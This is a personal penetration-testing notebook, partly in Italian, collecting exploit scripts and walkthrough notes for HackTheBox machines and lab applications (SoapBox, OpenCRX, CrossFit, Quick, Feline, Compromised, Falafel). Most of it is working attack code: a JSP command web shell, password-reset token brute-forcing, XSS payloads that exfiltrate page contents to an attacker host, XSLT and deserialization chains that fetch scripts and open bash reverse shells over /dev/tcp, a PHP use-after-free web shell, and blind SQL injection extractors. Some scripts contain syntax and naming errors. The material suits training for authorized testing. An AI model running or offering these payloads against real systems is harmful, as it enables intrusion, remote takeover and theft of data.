
### Mangeeninge 

```python
import sys
import requests
import urllib3

#Disabilitiamo gli warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main():
	if len(sys.argv) != 2:
		print "(+) usage %s <target>" % sys.argv[0]
		print "(+) eg: %s target" % sys.argv[0]
		sys.exit(1)

	t = sys.argv[1]

	sqli = ";"

	#GET request per URL vulnerabile con i parametri
	r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % t, params='ForMasRange=1&userId=1%s' % sqli, verify=False)
	
	print r.text
	print r.headers

if __name__ == '__main__':
	main()
```

===============

python3 -m venv venv

source /bin/activate

pip install requests

pip install telnetlib3

pip install flask

  

python3 soapbox.py <target:port> <kali>

  

=================================== SETTING SQL LAB DB LOGS

  

1. Once logged in, we'll open the MySQL server configuration file located at /etc/mysql/my.cnf and uncomment the following lines under the Logging and Replication section:

student@atutor:~$ sudo nano /etc/mysql/my.cnf

[mysqld]

...

general_log_file        = /var/log/mysql/mysql.log

general_log             = 1

2. sudo systemctl restart MySQL (rivvia mysql)

3. sudo tail /var/log/mysql/mysql.log (i logs finiscono qui)

SETTING PHP WEB APP

1. we can also enable the PHP display_errors directive. With this directive turned on, we will be able to see any PHP errors we trigger in a verbose form, which can aid us during our analysis. To do that, we add the following line to the /etc/php5/apache2/php.ini file:

display_errors = On

2. sudo systemctl restart apache2

  

===================================== SETTING REMOTE DEBUGGING

1. /home/frappe/frappe-bench/env/bin/pip install ptvsd decommentare:

2. frappe@ubuntu:~$ cat /home/frappe/frappe-bench/Procfile 

 redis_cache: redis-server config/redis_cache.conf

 redis_socketio: redis-server config/redis_socketio.conf

 redis_queue: redis-server config/redis_queue.conf

 #web: bench serve --port 8000

  

3. rsync -azP <USERNAME>@<TARGET_IP>:/home/frappe/frappe-bench ./   #scaricare il source code

4. 

  

===================================== SOAPBOX

************ LFI

1. Notiamo che possiamo scaricare file tramite link download

2. Dal codice in StoryController.class riga 192 notiamo che ../ è sostituito con "" dunque bypassiamo il filtro con …/./ con l'URL /download?id=…/./etc/passwd

3. In AdminController.class riga 50 notiamo che il file si trova in "/conf/apikey" dunque /download?id=…/./conf/apikey

4. adesso andiamo su /api/users?apiKey={APIKEY}

  

*********** SQLi

5. In SqlUtil.class riga 6 notiamo che sostituisce ("'", "")

6. Notiamo in SqlUtil in riga 192 si possono fare chiamate POST al db sul parametro id dunque proviamo sqli in URL-encoded:

 # Se restituiscono 200 sono OK altrimenti 500

 a. 1 AND (SELECT 1 from pg_sleep(10))=1 

 b. 1 AND (SELECT 1 FROM tokens LIMIT 1)=1

 c. 1 AND (SELECT LENGTH(token) FROM tokens WHERE user_id=1 LIMIT 1)>0

 d. 1 AND ASCII(substr((SELECT token FROM tokens WHERE user_id=1 LIMIT 1),1,1))>0

 e. 1 AND (SELECT CASE WHEN ASCII(substr((SELECT token FROM tokens WHERE user_id=1 LIMIT 1),1,1))=1 THEN 1=(SELECT 1 FROM categories) END)

7. In /generateMagicLink notiamo che inviando una chiamata POST con l'URL /generateMagicLink/username=admin si crea un token che possiamo ricavarci con sqli

8. Poi notiamo dal codice che il token preso possiamo usarlo per accedere come admin in URL /magicLink/{token}

9. Una volta effettuato l'accesso come admin in AdminController.class possiamo inviare email con emailNewUser

10. Possiamo cambiare il contenuto della mail di benvenuto e mettere il nostro payload

  

==================================== AKOUNT

************ XSS

1. In VS nel codice sorgente cerco "raw.*\}\}" e noto che è usato in admin.html e account.html

2. Notiamo che in account.html riga 26 non c'è sanitizazzione del file caricato

3. Nella funzione addAvatar() riga 125
### OpenCRX
#### OpenCRXToken.java

```Java
import java.util.Random;

public class OpenCRXToken{
	public static void main(String args[]){
		int length = 40;
		long start = Long.parseLong("1769879925000");
		long stop = Long.parseLong("1769879925999");
		String token = "";
		
		for (long l = start; l < stop; l++){
			System.out.println(l);
			token = getRandomBase62(length, l);
			System.out.println(token);
		}
		
	}
	public static String getRandomBase62(int length, long seed){
	   	String alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    		Random random = new Random(System.currentTimeMillis());
    		String s = "";
    		for (int i = 0; i < length; i++){
    			s = s + "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(random.nextInt(62));
    		}
      			 
    		return s;
	}
	
}
```

#### OpenCRXResetPassword.py

```python
#!/usr/bin/python3

import requests
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-u','--user', help='Username to target', required=True)
parser.add_argument('-p','--password', help='Password value to set', required=True)
args = parser.parse_args()

target = "http://opencrx:8080/opencrx-core-CRX/PasswordResetConfirm.jsp"

print("Starting token spray. Standby.")
with open("tokens.txt", "r") as f:
    for word in f:
        # t=resetToken&p=CRX&s=Standard&id=guest&password1=password&password2=password
        payload = {'t':word.rstrip(), 'p':'CRX','s':'Standard','id':args.user,'password1':args.password,'password2':args.password}

        r = requests.post(url=target, data=payload)
        res = r.text

        if "Unable to reset password" not in res:
            print("Successful reset with token: %s" % word)
            break
```

#### shell.jsp

```jsp
// note that linux = cmd and windows = "cmd.exe /c + cmd" 

<FORM METHOD=GET ACTION='cmdjsp.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>

<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";

   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec("cmd.exe /C " + cmd);
         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) {
            output += s;
         }
      }
      catch(IOException e) {
         e.printStackTrace();
      }
   }
%>

<pre>
<%=output %>
</pre>

<!--    http://michaeldaw.org   2006    -->
```

### 
#### Deserialization Object

```JavaScript
var payload = {“rce”:”_$$ND_FUNC$$_function (){ eval(String.fromCharCode(<CHARCODE>))}()"}

var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(payload));
```

### CrossFit

#### ReadReport.js

```JavaScript
function read_report(){
	var req = new XMLHttpRequest();
	var url = "http://gym-club.crossfit.htb/security_threat/report.php";
	req.open("GET", url, true);
	req.send();
	req.onreadystatechange = function(){
	if(req.readyState == XMLHttpRequest.DONE){
		var resultText = btoa(req.response);
		send(resultText);
		}
	}
}

function send(reseultText){
	var xhr = new XMLHttpRequest();
	xhr.open('GET', 'http://IP_KALI:LPORT/?xss=' + resultText, true);
	xhr.send();
}

read_report();
```

#### AutoXss.py

```python
#!/usr/bin/python3
# Auto XSS and Session Rding - CrossFit - HackTheBox

import argparse
import requests
import sys
import base64
from threading import Thread
import threading
import http.server
import socket
from http.server import HTTPServer, SimpleHTTPRequestHandler
import os
import re

'''Setting up sometghin important'''
proxies = {"http":"http://127.0.0.1:8080", "https":"http://127.0.0.1:8080"}
r = requests.session()

'''Here come the functions'''

# Setting the python web
def webServer():
	debug = True
	server = http.server.ThreadingHTTPServer(('0.0.0.0',80), SimpleHTTPRequestHandler)
	
	if debug:
		print("[+] Starting Web Server in background [+]")
		thread = threading.Thread(target = server.serve_forever)
		thread.daemon = True
		thread.start()
	else:
		print("Starting Server")
		print('Starting server at http://{}:{}'.format('0.0.0.0', 80))
		server.serve_forever()
		
def triggerXSS(lhost):
	url = "http://gym-club.crossfit.htb:80/blog-single.php"
	headers = {"User-Agent":"<script src=\"http://%s/readReport.js\"></script>" %lhost, "Content-Type":"application/x-www-form-urlencoded"}
	data = {"name":"hackerami", "email":"hackerami@example.com", "phone":"123456", "message":"random message!!!", "submit":"submit"}
	r.post(url, headers=headers, data=data, proxies=proxies)
	
def b64d(s):
	return base64.b64decode(s).decode()
	
# Create JS payload to be sent
def createPayload(file, lhost):
	payload = "function read_report(){\n"
    payload += "        var req=new XMLHttpRequest();\n"
    payload += "        var url = 'http://gym-club.crossfit.htb/%s';\n" %file
    payload += "        req.open('GET', url, true);\n"
    payload += "        req.send();\n"
    payload += "        req.onreadystatechange = function(){\n"
    payload += "        if(req.readyState == XMLHttpRequest.DONE){\n"
    payload += "                var resultText = btoa(req.response);\n"
    payload += "                send(resultText)\n"
    payload += "                }\n"
    payload += "        }\n"
    payload += "}\n"
    payload += "function send(resultText){\n"
    payload += "        var xhr=new XMLHttpRequest();\n"
    payload += "        xhr.open('GET', 'http://%s:9999/' + resultText, true);\n" %lhost
    payload += "        xhr.send();\n"
    payload += "}\n"
    payload += "read_report();\n"
    f = open("readReport.js", "w")
    f.write(payload)
    f.close()

# Function for reading file
def readFile():
	f = open('get.txt', 'r')
	output = f.read()
	if len(output) < 5:
		print("[+] File does not exist or I can't read it!!")
	else:
		b64encoded = re.search(' .* ', output).group(0)
		b64encoded = b64encoded.removeprefix(" /")
		print()
		print(b64d(b64encoded))

# Function to iterate though files
def xssLFI(lhost, rhost):
	prefix = "Reading file: "
	file = ""
	while True:
		file = input(prefix)
		if file != "exit":
			createPayload(file, lhost)
			tiggerXSS(lhost)
			os.system('nc -q 5 -lvnp 9999 > get.txt 2>/dev/null &')
			os.system("sleep 5")
			readFile()
		else:
			print("[+] Exittttttttttting.... !!!")

def main():
	# Parse Arguments
	parser = argparse.ArgumentParser()
	parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
	parser.add_argument('-li', '--localip', help='Local ip address or hostname', required=True)
	args = parser.parse_args()
	
	rhost = args.target
	lhost = args.localip
	
	'''Here we call the functions'''
	# Set up the web python server
	webServer()
	# Trigger it
	xssLFI(lhost, rhost)
	
	if __name__ == '__main__'
		main()
```

#### token.js
```JS
// Function created to simplify the debbug, always send as param the value you want to debbug
function debug(debug){
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'http://10.10.14.20:9999/' + debug, true);
        xhr.send();
}

// Function to parse the response and get the token from it
function getToken(response){
        var parser = new DOMParser();
        var response_text = parser.parseFromString(response, "text/html");
        return response_text.getElementsByName("_token")[0].value;
}

// Function to make the things happen
function createAccount(){
        // Get the Token
        var req_token = new XMLHttpRequest();
        // Request both from get token and create user must be in the same session
        req_token.onreadystatechange = function(){
                if (req_token.readyState == XMLHttpRequest.DONE) {
                        var token = getToken(req_token.responseText);
                        debug(token);
                        // Create the account in the same "session"
                        var req_create = new XMLHttpRequest();
                        var url_create = 'http://ftp.crossfit.htb/accounts';
                        req_create.open("POST", url_create, false);
                        req_create.withCredentials = true;
                        req_create.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
                        var values = "username=0x4rt3mis&pass=0x4rt3mis0x4rt3mis&_token=" + token;
                        req_create.send(values);
                        debug(btoa(req_create.response));
                }
        }
        // After parse everything, just trigger it
        var url = 'http://ftp.crossfit.htb/accounts/create';
        req_token.open('GET', url, false);
        req_token.withCredentials = true;
        req_token.send();
}

// Trriger the account creation
createAccount()
```

### ForwardSlash

#### auto_lfi.py

```python
#!/usr/bin/python3

import argparse
import requests
import sys
import base64
import re

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''
# Base64 decode things
def b64d(s):
    return base64.b64decode(s).decode()

# First let's create the user
def createLogin():
    print("[+] Let's create an user !! [+]")
    url = "http://backup.forwardslash.htb:80/register.php"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"username": "0x4rt3mis", "password": "123456", "confirm_password": "123456"}
    r.post(url, headers=headers, data=data, proxies=proxies)
    print("[+] User Created !! [+]")
    
# Just login
def loginUser():
    print("[+] Just logging ! [+]")
    url = "http://backup.forwardslash.htb:80/login.php"
    data = {"username": "0x4rt3mis", "password": "123456"}
    r.post(url, cookies=r.cookies, data=data, proxies=proxies)
    print("[+] User Logged in !!! [+]")

def readFile():
    url = "http://backup.forwardslash.htb:80/profilepicture.php"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    print("[+] Just type exit to exit !!!! [+]")
    prefix = "Reading file: "
    file = ""
    while file != "exit":
        file = input(prefix)
        data = {"url": "php://filter/convert.base64-encode/resource=%s" %file}
        output = r.post(url,headers=headers,data=data,proxies=proxies)
        b64encoded = re.search('</html>\n+.*', output.text).group(0)
        if len(b64encoded) < 9:
            print("[+] File does NOT EXIST !!! Or I can't read it !!! [+]")
        else:
            b64encoded = b64encoded.removeprefix("</html>\n")
            print()
            print(b64d(b64encoded)) 
            print()
    
def main():
    '''Here we call the functions'''
    # Create user
    createLogin()
    # Login
    loginUser()
    # Read file
    readFile()
    
if __name__ == '__main__':
    main()
```

### Quick
#### auto_rce.py

```python
#!/usr/bin/python3

import argparse
import requests
import sys
from threading import Thread
import threading                     
import http.server                                  
import socket                                   
from http.server import HTTPServer, SimpleHTTPRequestHandler
import socket, telnetlib
from threading import Thread
import os
import random

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''
# Set the handler
def handler(lport,target):
    print("[+] Starting handler on %s [+]" %lport) 
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',lport))
    s.listen(1)
    conn, addr = s.accept()
    print("[+] Connection from %s [+]" %target) 
    t.sock = conn
    cleanUp(nameone,nametwo,nameshell)
    print("[+] Shell'd [+]")
    t.interact()
  
# Setting the python web server
def webServer():
    debug = True                                    
    server = http.server.ThreadingHTTPServer(('0.0.0.0', 80), SimpleHTTPRequestHandler)
    if debug:                                                                                                                                
        print("[+] Starting Web Server in background [+]")
        thread = threading.Thread(target = server.serve_forever)
        thread.daemon = True                                                                                 
        thread.start()                                                                                       
    else:                                               
        print("Starting Server")
        print('Starting server at http://{}:{}'.format('0.0.0.0', 80))
        server.serve_forever()
    
# Let's login on the page
def loginSite(rhost):
    print("[+] Let's login!! [+]")
    url = "http://%s:9001/login.php" %rhost
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"email": "elisa@wink.co.uk", "password": "Quick4cc3$$"}
    r.post(url, headers=headers, data=data, proxies=proxies)
    print("[+] Looogged in !! [+]")
    
# Let's create the sh malicious file    
def createShellPayload(lhost,lport,nameshell):
    print("[+] Let's create our shell payload !! [+]")
    payload = "#!/bin/sh\n"
    payload += "bash -i >& /dev/tcp/%s/%s 0>&1" %(lhost,lport)
    h = open("%s" %nameshell, "w")
    h.write(payload)
    h.close()
    print("[+] Done, shell file created !! [+]")
    
# Let's create the staged files to get the reverse shell
def createPayload(lhost,nameone,nametwo,nameshell):
    print("[+] Let's create the malicious files to get reverse shell !! [+]")
    print("[+] %s is the shell file ! [+]" %nameshell)
    print("[+] %s is the stage one file ! [+]" %nameone)
    print("[+] %s is the stage two file ! [+]" %nametwo)
    # Create the reverse shell
    payload = '<?xml version="1.0" ?>\n'
    payload += '<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">\n'
    payload += '<xsl:output method="xml" omit-xml-declaration="yes"/>\n'
    payload += '<xsl:template match="/"\n'
    payload += 'xmlns:xsl="http://www.w3.org/1999/XSL/Transform"\n'
    payload += 'xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">\n'
    payload += '<root>\n'
    payload += '<xsl:variable name="cmd"><![CDATA[wget http://%s/%s -O /tmp/shell.sh]]></xsl:variable>\n' %(lhost,nameshell)
    payload += '<xsl:variable name="rtObj" select="rt:getRuntime()"/>\n'
    payload += '<xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>\n'
    payload += 'Process: <xsl:value-of select="$process"/>\n'
    payload += 'Command: <xsl:value-of select="$cmd"/>\n'
    payload += '</root>\n'
    payload += '</xsl:template>\n'
    payload += '</xsl:stylesheet>\n'
    f = open("%s" %nameone, "a")
    f.write(payload)
    f.close()
    payload1 = '<?xml version="1.0" ?>\n'
    payload1 += '<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">\n'
    payload1 += '<xsl:output method="xml" omit-xml-declaration="yes"/>\n'
    payload1 += '<xsl:template match="/"\n'
    payload1 += 'xmlns:xsl="http://www.w3.org/1999/XSL/Transform"\n'
    payload1 += 'xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">\n'
    payload1 += '<root>\n'
    payload1 += '<xsl:variable name="cmd"><![CDATA[bash /tmp/shell.sh]]></xsl:variable>\n'
    payload1 += '<xsl:variable name="rtObj" select="rt:getRuntime()"/>\n'
    payload1 += '<xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>\n'
    payload1 += 'Process: <xsl:value-of select="$process"/>\n'
    payload1 += 'Command: <xsl:value-of select="$cmd"/>\n'
    payload1 += '</root>\n'
    payload1 += '</xsl:template>\n'
    payload1 += '</xsl:stylesheet>\n'
    f = open("%s" %nametwo, "a")
    f.write(payload1)
    f.close()
    print("[+] Files Created !!! [+]")

# Let's trigger the reverse shell
def triggerPay(rhost,lhost,nameone,nametwo):
    print("[+] Enjoy your reverse shell !! [+]")
    url = "http://%s:9001/ticket.php" %rhost
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    # Send the malicious download
    ticket1 = random.randint(1000,2000)
    data = {"title": "0x4rt3mis", "msg": "Describe your query", "id": "TKT-%s;<esi:include src=\"http://localhost/\" stylesheet=\"http://%s/%s\"> </esi:include>" %(ticket1,lhost,nameone)}
    r.post(url, headers=headers, cookies=r.cookies, data=data, proxies=proxies)
    os.system("sleep 5")
    # Trigger the reverse shell
    ticket2 = random.randint(1000,2000)
    data = {"title": "0x4rt3mis", "msg": "Describe your query", "id": "TKT-%s;<esi:include src=\"http://localhost/\" stylesheet=\"http://%s/%s\"> </esi:include>" %(ticket2,lhost,nametwo)}
    r.post(url, headers=headers, cookies=r.cookies, data=data, proxies=proxies)
    
# Cleaning up
def cleanUp(nameone,nametwo,nameshell):
    os.system("rm %s" %nameone)
    os.system("rm %s" %nametwo)
    os.system("rm %s" %nameshell)    
    
def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-li', '--localip', help='Local ip address or hostname', required=True)
    parser.add_argument('-p', '--port', help='Local port to receive the shell', required=True)
    args = parser.parse_args()

    rhost = args.target
    lhost = args.localip
    lport = args.port
    
    global nameone
    global nametwo
    global nameshell
    nametwo = random.randint(3000,4000)
    nameone = random.randint(3000,4000)
    nameshell = random.randint(3000,4000)

    '''Here we call the functions'''
    # Set up the handler
    thr = Thread(target=handler,args=(int(lport),rhost))
    thr.start()
    # Set up the web python server
    webServer()
    # Login on the page
    loginSite(rhost)
    # Create the payloads
    createShellPayload(lhost,lport,nameshell)
    createPayload(lhost,nameone,nametwo,nameshell)
    # Trigger the reverse shell
    triggerPay(rhost,lhost,nameone,nametwo)

if __name__ == '__main__':
    main()
```

### Feline
#### auto_tom.py

```python
#!/usr/bin/python3
# Author: 0x4rt3mis
# Auto Tomcat Shell - Feline HackTheBox
import argparse
import requests
import sys
import socket, telnetlib
from threading import Thread
import base64
import os

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''
#B64 things
def b64e(s):
    return base64.b64encode(s.encode()).decode()

# Set the handler
def handler(lport,target):
    print("[+] Starting handler on %s [+]" %lport) 
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('0.0.0.0',lport))
    s.listen(1)
    conn, addr = s.accept()
    print("[+] Connection from %s [+]" %target) 
    t.sock = conn
    print("[+] Shell'd [+]")
    t.interact()

# Download yososerial if it's not alreadt on the working folder    
def downloadPayGen():
    print("[+] Let's test to see if we already have yososerial on the working folder ! [+]")
    output_jar = "ysoserial-master-SNAPSHOT.jar"
    if not os.path.isfile(output_jar):
        print("[+] I did no locate it, let's dowload ! WAAAAAAAIT SOME MINUTES TO COMPLETE IT ! [+]")
        os.system("wget -q https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar")
    else:
        print("[+] We already have it, let's exploit !!! [+]")
  
# Create the malicious serialized reverse shell payload
def createBin(lhost,lport):
    print("[+] Let's make our payload !!! [+]")
    reverse = "bash -i >& /dev/tcp/%s/%s 0>&1" %(lhost,lport)
    reverse = b64e(reverse)
    cmd = "bash -c {echo,%s}|{base64,-d}|{bash,-i}" %(reverse)
    os.system("java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 '%s' > payload.session" %cmd)
    print("[+] Payload Createeeeed !!! [+]")
    
# Upload Malicious session
def maliciousUpload(rhost):
    print("[+] Let's upload our payload !!! [+]")
    url = "http://%s:8080/upload.jsp?email=0x4rt3mis@email.com" %rhost
    data = b''
    multipart_data = {
        'image': ('payload.session', open('payload.session', 'rb'), "application/octet-stream"),
    }
    upload = r.post(url, files=multipart_data, proxies=proxies)
    print("[+] Uploadeddeded !!! [+]")
    
# Get the reverse
def triggerPayload(rhost):
    print("[+] Let's trigger the reverse shell [+]")
    url = "http://%s:8080/service/" %rhost
    cookies = {"JSESSIONID": "../../../../../../../../../opt/samples/uploads/payload"}
    requests.get(url, cookies=cookies, proxies=proxies)

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    parser.add_argument('-ip', '--lhost', help='Local ip address or hostname', required=True)
    parser.add_argument('-p', '--lport', help='Local Port', required=True)
    args = parser.parse_args()
    
    rhost = args.target
    lhost = args.lhost
    lport = args.lport

    '''Here we call the functions'''
    # Set up the handler
    thr = Thread(target=handler,args=(int(lport),rhost))
    thr.start()
    # Download the yosoerial
    downloadPayGen()
    # Create the malicious session file
    createBin(lhost,lport)
    #Upload Malicious session
    maliciousUpload(rhost)
    # Get the reverse
    triggerPayload(rhost)

if __name__ == '__main__':
    main()
```

### Compromissed
#### auto_rce.py

```python
#!/usr/bin/python3
# Author: 0x4rt3mis
# Read output from a pseudoshell
# Compromissed HackTheBox
import argparse
import requests
import sys
import os
import re
import urllib

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''

# Let's login on the admin panel
def loginPage(rhost):
    print("[+] Let's Login ! [+]")
    url = "http://%s:80/shop/admin/login.php" %rhost
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"username": "admin", "password": "theNextGenSt0r3!~", "login": "true"}
    r.post(url, headers=headers, data=data, proxies=proxies, allow_redirects=True)
    print("[+] Loged In Succeess !! [+]")

# Let's upload it
def maliciousUpload(rhost):
    print("[+] Let's upload the malicious file !! [+]")
    url = "http://%s/shop/admin/?app=vqmods&doc=vqmods" %rhost
    token_get = r.get(url, proxies=proxies, cookies=r.cookies)
    token = re.search('input.+?name="token".+?value="(.+?)"', token_get.text).group(1)
    data = '''<?php
if (isset($_REQUEST['cmd'])) {
    pwn($_REQUEST['cmd']);
}
pwn("uname -a");
function pwn($cmd) {
    global $abc, $helper;
    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }
    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }
    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = chr($v & 0xff);
            $v >>= 8;
        }
    }
    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }
    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);
        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);
        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);
            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }
        if(!$data_addr || !$text_size || !$data_size)
            return false;
        return [$data_addr, $text_size, $data_size];
    }
    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;
            return $data_addr + $i * 8;
        }
    }
    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }
    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { # system
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }
    class ryat {
        var $ryat;
        var $chtg;
        
        function __destruct()
        {
            $this->chtg = $this->ryat;
            $this->ryat = 1;
        }
    }
    class Helper {
        public $a, $b, $c, $d;
    }
    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }
    $n_alloc = 10; # increase this value if you get segfaults
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_repeat('A', 79);
    $poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:"ryat":2:{s:4:"ryat";R:3;s:4:"chtg";i:2;}}i:1;i:3;i:2;R:5;}';
    $out = unserialize($poc);
    gc_collect_cycles();
    $v = [];
    $v[0] = ptr2str(0, 79);
    unset($v);
    $abc = $out[2][0];
    $helper = new Helper;
    $helper->b = function ($x) { };
    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }
    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;
    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);
    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);
    $closure_obj = str2ptr($abc, 0x20);
    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }
    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }
    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }
    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }
    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }
    # pwn
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler
    ($helper->b)($cmd);
    exit();
}
?>
'''
    multipart_data = {
        'token' :(None, token),
        'vqmod': ('0x4rt3mis.php', data, "application/xml"),
        'upload' : (None,"Upload")
    }
    upload = r.post(url, files=multipart_data, proxies=proxies)
    print("[+] Malicious Uploadedeee !! [+]")
    
# Start the pseudo shell
def setPseudo(rhost):
    url = "http://%s/shop/vqmod/xml/0x4rt3mis.php" %rhost
    url_prefix = url + "?cmd=echo -n $(whoami)':'$(pwd):$ "
    req = r.get(url_prefix, proxies=proxies)
    prefix = req.text
    url_restore = url
    cmd = ""
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    while cmd != "exit":
        url = url_restore
        cmd = input(prefix)
        cmd = urllib.parse.quote_plus(cmd, safe='\"\'()/')
        data = "cmd=%s" %cmd
        output = r.post(url,headers=headers,data=data,proxies=proxies)
        print()
        print(output.text) 
        prefix = req.text
        url = url_restore

def main():
    # Parse Arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='Target ip address or hostname', required=True)
    args = parser.parse_args()
    
    rhost = args.target

    '''Here we call the functions'''
    # Login on the app
    loginPage(rhost)
    # Upload the malicious php
    maliciousUpload(rhost)
    # Use as pseudoshell
    setPseudo(rhost)

if __name__ == '__main__':
    main()

```

### Falafel
#### auto_sqli.py

```python
#!/usr/bin/python3
#Author: 0x4rt3mis
#Auto SQLI MySQL Version - Falafel HackTheBox
import argparse
import requests
import sys

'''Setting up something important'''
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.session()

'''Here come the Functions'''
def getVersion(rhost):
    sqli_target = 'http://' + rhost +"/login.php"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    limit = 1
    char = 42
    prefix = []
    print("[+] The version of MySQL is.... [+]")
    while(char!=123):
        injection_string = "username=chris'AND+ascii(substring(version(),%d,1))=+%s+--+-&password=test" %(limit,char)
        response = r.post(sqli_target,proxies=proxies,verify=False,cookies=r.cookies, data=injection_string,headers=headers).text
        # On the if put a error message (not success)
